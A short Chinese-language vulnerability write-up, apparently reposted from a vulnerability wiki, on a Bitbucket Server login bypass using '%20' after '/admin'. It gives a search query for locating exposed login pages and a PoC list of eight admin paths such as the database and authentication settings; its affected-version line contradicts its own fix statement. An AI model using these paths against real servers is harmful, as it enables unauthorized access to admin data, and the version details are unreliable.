---
title: "Atlassian Bitbucket 登录绕过漏洞"
date: 2026-10-16 09:06:45
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Bitbucket"
tags:
  - "Bitbucket"
  - "漏洞复现"
---
## 漏洞描述

此错误已修复并部署在 Bitbucket Server > 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据

## 漏洞影响

```
Bitbucket Server > 4.8
```

## 网络测绘

```
title="Log in - Bitbucket"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241429046.png)

验证POC

```
/admin%20/mail-server
/admin%20/db
/admin%20/db/edit
/admin%20/license
/admin%20/logging
/admin%20/server-settings
/admin%20/authentication
/admin%20/avatars
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241429345.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Atlassian-Bitbucket-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md)
